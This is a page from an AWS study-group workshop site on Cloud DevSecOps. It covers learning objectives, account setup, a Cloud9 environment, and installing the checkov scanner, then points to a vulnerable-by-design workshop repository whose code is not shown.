<!DOCTYPE html>
<html lang="en" class="js csstransforms3d">
  <head><script src="/aws-ws/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=aws-ws/livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="generator" content="Hugo 0.123.7">
    <meta name="description" content="">
<meta name="author" content="tuanatran.vn@gmail.com">

    <link rel="icon" href="/aws-ws/images/favicon.png" type="image/png">

    <title>Cloud DevSecOps :: </title>

    
    <link href="/aws-ws/css/nucleus.css?1717056299" rel="stylesheet">
    <link href="/aws-ws/css/fontawesome-all.min.css?1717056299" rel="stylesheet">
    <link href="/aws-ws/css/hybrid.css?1717056299" rel="stylesheet">
    <link href="/aws-ws/css/featherlight.min.css?1717056299" rel="stylesheet">
    <link href="/aws-ws/css/perfect-scrollbar.min.css?1717056299" rel="stylesheet">
    <link href="/aws-ws/css/auto-complete.css?1717056299" rel="stylesheet">
    <link href="/aws-ws/css/atom-one-dark-reasonable.css?1717056299" rel="stylesheet">
    <link href="/aws-ws/css/theme.css?1717056299" rel="stylesheet">
    <link href="/aws-ws/css/hugo-theme.css?1717056299" rel="stylesheet">
    
    <link href="/aws-ws/css/theme-workshop.css?1717056299" rel="stylesheet">
    
    

    <script src="/aws-ws/js/jquery-3.3.1.min.js?1717056299"></script>

    <style>
      :root #header + #content > #left > #rlblock_left{
          display:none !important;
      }
      
    </style>
    
  </head>
  <body class="" data-url="/aws-ws/6-wsaudio/6.1-devsecops/">
    <nav id="sidebar" class="showVisitedLinks">



  <div id="header-wrapper">
    <div id="header">
      <a id="logo" href="/aws-ws">

<svg id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 60 30" width="30%"><defs><style>.cls-1{fill:#fff;}.cls-2{fill:#f90;fill-rule:evenodd;}</style></defs><title>AWS-Logo_White-Color</title><path class="cls-1" d="M14.09,10.85a4.7,4.7,0,0,0,.19,1.48,7.73,7.73,0,0,0,.54,1.19.77.77,0,0,1,.12.38.64.64,0,0,1-.32.49l-1,.7a.83.83,0,0,1-.44.15.69.69,0,0,1-.49-.23,3.8,3.8,0,0,1-.6-.77q-.25-.42-.51-1a6.14,6.14,0,0,1-4.89,2.3,4.54,4.54,0,0,1-3.32-1.19,4.27,4.27,0,0,1-1.22-3.2A4.28,4.28,0,0,1,3.61,7.75,6.06,6.06,0,0,1,7.69,6.46a12.47,12.47,0,0,1,1.76.13q.92.13,1.91.36V5.73a3.65,3.65,0,0,0-.79-2.66A3.81,3.81,0,0,0,7.86,2.3a7.71,7.71,0,0,0-1.79.22,12.78,12.78,0,0,0-1.79.57,4.55,4.55,0,0,1-.58.22l-.26,0q-.35,0-.35-.52V2a1.09,1.09,0,0,1,.12-.58,1.2,1.2,0,0,1,.47-.35A10.88,10.88,0,0,1,5.77.32,10.19,10.19,0,0,1,8.36,0a6,6,0,0,1,4.35,1.35,5.49,5.49,0,0,1,1.38,4.09ZM7.34,13.38a5.36,5.36,0,0,0,1.72-.31A3.63,3.63,0,0,0,10.63,12,2.62,2.62,0,0,0,11.19,11a5.63,5.63,0,0,0,.16-1.44v-.7a14.35,14.35,0,0,0-1.53-.28,12.37,12.37,0,0,0-1.56-.1,3.84,3.84,0,0,0-2.47.67A2.34,2.34,0,0,0,5,11a2.35,2.35,0,0,0,.61,1.76A2.4,2.4,0,0,0,7.34,13.38Zm13.35,1.8a1,1,0,0,1-.64-.16,1.3,1.3,0,0,1-.35-.65L15.81,1.51a3,3,0,0,1-.15-.67.36.36,0,0,1,.41-.41H17.7a1,1,0,0,1,.65.16,1.4,1.4,0,0,1,.33.65l2.79,11,2.59-11A1.17,1.17,0,0,1,24.39.6a1.1,1.1,0,0,1,.67-.16H26.4a1.1,1.1,0,0,1,.67.16,1.17,1.17,0,0,1,.32.65L30,12.39,32.88,1.25A1.39,1.39,0,0,1,33.22.6a1,1,0,0,1,.65-.16h1.54a.36.36,0,0,1,.41.41,1.36,1.36,0,0,1,0,.26,3.64,3.64,0,0,1-.12.41l-4,12.86a1.3,1.3,0,0,1-.35.65,1,1,0,0,1-.64.16H29.25a1,1,0,0,1-.67-.17,1.26,1.26,0,0,1-.32-.67L25.67,3.64,23.11,14.34a1.26,1.26,0,0,1-.32.67,1,1,0,0,1-.67.17Zm21.36.44a11.28,11.28,0,0,1-2.56-.29,7.44,7.44,0,0,1-1.92-.67,1,1,0,0,1-.61-.93v-.84q0-.52.38-.52a.9.9,0,0,1,.31.06l.42.17a8.77,8.77,0,0,0,1.83.58,9.78,9.78,0,0,0,2,.2,4.48,4.48,0,0,0,2.43-.55,1.76,1.76,0,0,0,.86-1.57,1.61,1.61,0,0,0-.45-1.16A4.29,4.29,0,0,0,43,9.22l-2.41-.76A5.15,5.15,0,0,1,38,6.78a3.94,3.94,0,0,1-.83-2.41,3.7,3.7,0,0,1,.45-1.85,4.47,4.47,0,0,1,1.19-1.37A5.27,5.27,0,0,1,40.51.29,7.4,7.4,0,0,1,42.6,0a8.87,8.87,0,0,1,1.12.07q.57.07,1.08.19t.95.26a4.27,4.27,0,0,1,.7.29,1.59,1.59,0,0,1,.49.41.94.94,0,0,1,.15.55v.79q0,.52-.38.52a1.76,1.76,0,0,1-.64-.2,7.74,7.74,0,0,0-3.2-.64,4.37,4.37,0,0,0-2.21.47,1.6,1.6,0,0,0-.79,1.48,1.58,1.58,0,0,0,.49,1.18,4.94,4.94,0,0,0,1.83.92L44.55,7a5.08,5.08,0,0,1,2.57,1.6A3.76,3.76,0,0,1,47.9,11a4.21,4.21,0,0,1-.44,1.93,4.4,4.4,0,0,1-1.21,1.47,5.43,5.43,0,0,1-1.85.93A8.25,8.25,0,0,1,42.05,15.62Z"></path><path class="cls-2" d="M45.19,23.81C39.72,27.85,31.78,30,25,30A36.64,36.64,0,0,1,.22,20.57c-.51-.46-.06-1.09.56-.74A49.78,49.78,0,0,0,25.53,26.4,49.23,49.23,0,0,0,44.4,22.53C45.32,22.14,46.1,23.14,45.19,23.81Z"></path><path class="cls-2" d="M47.47,21.21c-.7-.9-4.63-.42-6.39-.21-.53.06-.62-.4-.14-.74,3.13-2.2,8.27-1.57,8.86-.83s-.16,5.89-3.09,8.35c-.45.38-.88.18-.68-.32C46.69,25.8,48.17,22.11,47.47,21.21Z"></path></svg>

</a>

    </div>
    
        <div class="searchbox">
    <label for="search-by"><i class="fas fa-search"></i></label>
    <input data-search-input id="search-by" type="search" placeholder="Search...">
    <span data-search-clear=""><i class="fas fa-times"></i></span>
</div>

<script type="text/javascript" src="/aws-ws/js/lunr.min.js?1717056299"></script>
<script type="text/javascript" src="/aws-ws/js/auto-complete.js?1717056299"></script>
<script type="text/javascript">
    
        var baseurl = "http:\/\/localhost:1313\/aws-ws\/";
    
</script>
<script type="text/javascript" src="/aws-ws/js/search.js?1717056299"></script>

    
  </div>

    <div class="highlightable">
    <ul class="topics">

        
          
          




 
  
    
    <li data-nav-id="/aws-ws/1-intro/" title="Introduction" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/1-intro/">
           <b> 1. </b> Introduction
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

          
          




 
  
    
    <li data-nav-id="/aws-ws/2-prepair/" title="Workshop Prepairation" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/2-prepair/">
           <b> 2. </b> Workshop Prepairation
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/2-prepair/2.1-docker/" title="Container" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/2-prepair/2.1-docker/">
           <b> 2.1 </b> Container
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/2-prepair/2.2-aws/" title="AWS" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/2-prepair/2.2-aws/">
           <b> 2.2 </b> AWS
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/2-prepair/2.3-terraform/" title="Terraform" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/2-prepair/2.3-terraform/">
           <b> 2.3 </b> Terraform
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/2-prepair/2.4-git/" title="Git" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/2-prepair/2.4-git/">
           <b> 2.4 </b> Git
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/2-prepair/2.5-local/" title="Local" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/2-prepair/2.5-local/">
           <b> 2.5 </b> Local
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

          
          




 
  
    
    <li data-nav-id="/aws-ws/3-config/" title="Configuration" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/3-config/">
           <b> 3. </b> Configuration
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/3-config/3.1-iac/" title="IaC" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/3-config/3.1-iac/">
           <b> 3.1 </b> IaC
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/3-config/3.1-iac/3.1.1-ec2/" title="EC2" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/3-config/3.1-iac/3.1.1-ec2/">
           <b> 3.1.1 </b> EC2
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/3-config/3.1-iac/3.1.2-s3/" title="S3" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/3-config/3.1-iac/3.1.2-s3/">
           <b> 3.1.2 </b> S3
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

          
          




 
  
    
    <li data-nav-id="/aws-ws/4-cleanup/" title="Resource Cleanup" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/4-cleanup/">
           <b> 4. </b> Resource Cleanup
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/4-cleanup/4.1-ec2/" title="IaC" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/4-cleanup/4.1-ec2/">
           <b> 4.1 </b> IaC
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/4-cleanup/4.2-jenkins/" title="CICD" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/4-cleanup/4.2-jenkins/">
           <b> 4.2 </b> CICD
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

          
          




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/" title="Cloud Quest" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/">
           <b> 5. </b> Cloud Quest
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.1-compute/" title="Cloud Computing Essentials" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.1-compute/">
           <b> 5.1 </b> Cloud Computing Essentials
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.1-compute/5.1.1-learn/" title="Learn" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.1-compute/5.1.1-learn/">
           <b> 5.1.1 </b> Learn
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.1-compute/5.1.2-plan/" title="Plan" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.1-compute/5.1.2-plan/">
           <b> 5.1.2 </b> Plan
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.1-compute/5.1.3-practice/" title="Practice" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.1-compute/5.1.3-practice/">
           <b> 5.1.3 </b> Practice
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.1-compute/5.1.4-diy/" title="DIY" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.1-compute/5.1.4-diy/">
           <b> 5.1.4 </b> DIY
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.2-cloudfirst/" title="Cloud First Steps" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.2-cloudfirst/">
           <b> 5.2 </b> Cloud First Steps
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.3-computing/" title="Computing Solutions" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.3-computing/">
           <b> 5.3 </b> Computing Solutions
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.4-ceconomics/" title="Cloud Economics" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.4-ceconomics/">
           <b> 5.4 </b> Cloud Economics
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.5-networking/" title="Networking Concepts" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.5-networking/">
           <b> 5.5 </b> Networking Concepts
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.6-vpc/" title="Connecting VPCs" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.6-vpc/">
           <b> 5.6 </b> Connecting VPCs
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.6-vpc/5.6.1-learn/" title="Learn" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.6-vpc/5.6.1-learn/">
           <b> 5.6.1 </b> Learn
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.7-database/" title="Databases in Practice" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.7-database/">
           <b> 5.7 </b> Databases in Practice
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.8-security/" title="Core Security Concepts" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.8-security/">
           <b> 5.8 </b> Core Security Concepts
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.8-security/5.8.1-learn/" title="Learn" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.8-security/5.8.1-learn/">
           <b> 5.8.1 </b> Learn
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.9-efs/" title="File Systems in the Cloud" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.9-efs/">
           <b> 5.9 </b> File Systems in the Cloud
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.10-nosql/" title="First NoSQL Database" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.10-nosql/">
           <b> 5.10 </b> First NoSQL Database
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.11-healscal/" title="Auto-healing and Scaling Applications" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.11-healscal/">
           <b> 5.11 </b> Auto-healing and Scaling Applications
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/5-cloudquest/5.12-ha/" title="Highly Available Web Applications" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/5-cloudquest/5.12-ha/">
           <b> 5.12 </b> Highly Available Web Applications
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

          
          




 
  
    
    <li data-nav-id="/aws-ws/6-wsaudio/" title="AWS Workshop Studio" class="dd-item 
        parent
        
        
        ">
      <a href="/aws-ws/6-wsaudio/">
           <b> 6. </b> AWS Workshop Studio
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/6-wsaudio/6.1-devsecops/" title="Cloud DevSecOps" class="dd-item 
        
        active
        
        ">
      <a href="/aws-ws/6-wsaudio/6.1-devsecops/">
           <b> 6.1 </b> Cloud DevSecOps
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

          
          




 
  
    
    <li data-nav-id="/aws-ws/7-fcj/" title="First Cloud Journey" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/7-fcj/">
           <b> 7. </b> First Cloud Journey
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/7-fcj/7.1-cloud9/" title="Cloud 9" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/7-fcj/7.1-cloud9/">
           <b> 7.1 </b> Cloud 9
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/7-fcj/7.2-lambda/" title="Lambda" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/7-fcj/7.2-lambda/">
           <b> 7.2 </b> Lambda
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/7-fcj/7.3-sam/" title="SAM" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/7-fcj/7.3-sam/">
           <b> 7.3 </b> SAM
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/7-fcj/7.4-cf/" title="CloudFormation" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/7-fcj/7.4-cf/">
           <b> 7.4 </b> CloudFormation
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

          
          




 
  
    
    <li data-nav-id="/aws-ws/8-devopsaws/" title="DevOps On AWS" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/8-devopsaws/">
           <b> 8. </b> DevOps On AWS
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
      
        <ul>
          
          
            
          
          
          
        
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/8-devopsaws/8.1-commit/" title="CodeCommit" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/8-devopsaws/8.1-commit/">
           <b> 8.1 </b> CodeCommit
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/8-devopsaws/8.2-build/" title="CodeBuild" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/8-devopsaws/8.2-build/">
           <b> 8.2 </b> CodeBuild
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/8-devopsaws/8.3-deploy/" title="CodeDeploy" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/8-devopsaws/8.3-deploy/">
           <b> 8.3 </b> CodeDeploy
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
            
            




 
  
    
    <li data-nav-id="/aws-ws/8-devopsaws/8.4-pipeline/" title="CodePipleline" class="dd-item 
        
        
        
        ">
      <a href="/aws-ws/8-devopsaws/8.4-pipeline/">
           <b> 8.4 </b> CodePipleline
          
            <i class="fas fa-check read-icon"></i>
          
      </a>
      
              
    </li>
  
 

            
          
        
        </ul>
              
    </li>
  
 

          
         
    </ul>

    
    
      <section id="shortcuts">
        <h3>More</h3>
        <ul>
          
              <li> 
                  <a class="padding" href="https://aws.amazon.com/blogs"><i class='fab fa-aws'></i> AWS Study Group - Blog</a>
              </li>
          
              <li> 
                  <a class="padding" href="https://www.facebook.com/groups/awsstudygroupfcj"><i class='fab fa-facebook'></i> AWS Study Group - FB Group</a>
              </li>
          
        </ul>
      </section>
    

    
    <section id="prefooter">
      <hr/>
      <ul>
      
      
      
        <li><a class="padding" href="#" data-clear-history-toggle=""><i class="fas fa-history fa-fw"></i> Clear History</a></li>
      
      </ul>
    </section>
    
    <section id="footer">
      <left>
    
     <b> Workshop</b> <br>
    <img src="https://hitwebcounter.com/counter/counter.php?page=7920860&style=0038&nbdigits=9&type=page&initCount=0" title="Migrate" Alt="web counter"   border="0" /></a>  <br>
     <b> <a href="https://cloudjourney.awsstudygroup.com/">Cloud Journey</a></b> <br>
    <img src="https://hitwebcounter.com/counter/counter.php?page=7830807&style=0038&nbdigits=9&type=page&initCount=0" title="Total CLoud Journey" Alt="web counter"   border="0"   />
     
</left>
<left>
    <br>
    <br>
        <b> Last Updated </b> <br>
        <i><font color=orange>27-04-2024</font></i>
    </left>
    <left>
        <br>
        <br>
            <b> Team </b> <br>
            <i> <a href="https://www.linkedin.com/in/jotaguy"  style="color:orange">Gia HÆ°ng </a> <br>
        </i>
        </left>

<script async defer src="https://buttons.github.io/buttons.js"></script>

    </section>
  </div>
</nav>




        <section id="body">
        <div id="overlay"></div>
        <div class="padding highlightable">
              
              <div>
                <div id="top-bar">
                
                
                <div id="breadcrumbs" itemscope="" itemtype="http://data-vocabulary.org/Breadcrumb">
                    <span id="sidebar-toggle-span">
                        <a href="#" id="sidebar-toggle" data-sidebar-toggle="">
                          <i class="fas fa-bars"></i>
                        </a>
                    </span>
                  
                  <span id="toc-menu"><i class="fas fa-list-alt"></i></span>
                  
                  <span class="links">
                 
                 
                    
          
          
            
            
          
          
            
            
          
          
            <a href='/aws-ws/'> AWS Projects </a> > <a href='/aws-ws/6-wsaudio/'>AWS Workshop Studio</a> > Cloud DevSecOps
          
        
          
        
          
        
                 
                  </span>
                </div>
                
                    <div class="progress">
    <div class="wrapper">
<nav id="TableOfContents">
  <ul>
    <li>
      <ul>
        <li></li>
        <li><a href="#welcome-to-prisma-cloud">Welcome to Prisma Cloud</a></li>
      </ul>
    </li>
  </ul>
</nav>
    </div>
</div>

                
              </div>
            </div>
            
        <div id="head-tags">
        
        </div>
        
        <div id="body-inner">
          
            <h1>
              
              Cloud DevSecOps
            </h1>
          

        



	<h4 id="cloud-devsecops-with-hashicorp-palo-alto-networks--aws">Cloud DevSecOps with Hashicorp, Palo Alto Networks &amp; AWS</h4>
<ul>
<li>
<p>Learning Objectives</p>
<ul>
<li>Gain an understanding of DevSecOps and infrastructure as code (IaC) using Terraform</li>
<li>Scan IaC files for misconfigurations locally</li>
<li>Set up CI/CD pipelines to automate security scanning and policy enforcement</li>
<li>Fix security findings and AWS resource misconfigurations with Prisma Cloud</li>
</ul>
</li>
<li>
<p>DevSecOps : <a href="https://catalog.us-east-1.prod.workshops.aws/workshops/e31afbdf-ee40-41fa-a6c9-6ba2cb55fc1e/en-US/1-table-content/2-devsecops">https://catalog.us-east-1.prod.workshops.aws/workshops/e31afbdf-ee40-41fa-a6c9-6ba2cb55fc1e/en-US/1-table-content/2-devsecops</a></p>
<ul>
<li>The foundation of DevSecOps lies in the DevOps movement, wherein development and operations functions have merged to make deployments faster, safer, and more repeatable. Common DevOps practices include automated infrastructure build pipelines (CI/CD) and version-controlled manifests (GitOps) to make it easier to control cloud deployments. By baking software and infrastructure quality requirements into the release lifecycle, teams save time manually reviewing code, letting teams focus on shipping features.</li>
</ul>
</li>
<li>
<p>Infrastructure as Code Using Terraform</p>
<ul>
<li>Infrastructure as code (IaC) frameworks, such as HashiCorp Terraform, make cloud provisioning scalable and straightforward by leveraging automation and code. Defining our cloud infrastructure in code simplifies repetitive DevOps tasks and gives us a versioned, auditable source of truth for the state of an environment.</li>
</ul>
</li>
</ul>
<h4 id="setup--prerequisities">Setup / Prerequisities</h4>
<ul>
<li>Github account</li>
<li>Terraform Cloud account</li>
<li>AWS account (provided during workshop)</li>
<li>Prisma Cloud account (OPTIONAL)</li>
</ul>
<ol>
<li>
<p>Log into AWS Workshop: [!NOTE] This section is for live workshop events only.</p>
</li>
<li>
<p>Configure IAM User and API Key</p>
<ul>
<li>User name: <strong>tf-cloud</strong></li>
<li>Policies: <strong>AdminstratorAccess</strong></li>
<li>Create access key (other):  Access key (<strong>Third-party service</strong>)</li>
</ul>
</li>
<li>
<p>Configure AWS Cloud9 IDE</p>
<ul>
<li>
<p>Create environment (name): <strong>your-name-workspace</strong></p>
</li>
<li>
<p>Env type: New EC2 instance</p>
<ul>
<li>Additaional instance types:
<ul>
<li>Types: t3.medium</li>
<li>Platform: Amazon Linux 2023</li>
<li>Timeout: 30 minutes</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Network settings:</p>
<ul>
<li>Connection: AWS System Manager (SSM)
-&gt; Open in Cloud9</li>
</ul>
</li>
<li>
<p>Create and activate a python virtual environment</p>
</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>python3 -m venv env
</span></span><span style="display:flex;"><span>source ./env/bin/activate
</span></span></code></pre></div></li>
</ol>
<h4 id="section-1-code-scanning-with-checkov">Section 1: Code Scanning with checkov</h4>
<ul>
<li>Checkov: <a href="https://www.checkov.io/">https://www.checkov.io/</a></li>
<li>Checkov  is an open source &lsquo;policy-as-code&rsquo; tool that scans cloud infrastructure defintions to find misconfigurations before they are deployed. Some of the key benefits of checkov:
<ul>
<li>Runs as a command line interface (CLI) tool</li>
<li>Supports many common plaftorms and frameworks</li>
<li>Ships with thousands of default policies</li>
<li>Works on windows/mac/linux (any system with python installed)</li>
</ul>
</li>
</ul>
<p><strong>Install checkov:</strong> install, version , verify and see a list of every policy that Checkov can enforce</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#a6e22e">pip3</span> <span style="color:#a6e22e">install</span> <span style="color:#a6e22e">checkov</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">checkov</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">version</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">checkov</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">help</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">checkov</span> <span style="color:#f92672">--</span><span style="color:#a6e22e">list</span>
</span></span></code></pre></div><p><strong>1. Fork and clone target repository</strong></p>
<p>This workshop involves code that is vulnerable-by-design. All of the necessary code is contained within this repository  or workshop guide itself.</p>
<p><strong>Prisma Cloud DevSecOps Workshop</strong>  repository: <a href="https://github.com/paloAltoNetworks/prisma-cloud-devsecops-workshop">https://github.com/paloAltoNetworks/prisma-cloud-devsecops-workshop</a></p>
<p>Grab the repo URL from Github, then clone the <strong>forked repository</strong> to Cloud9.</p>
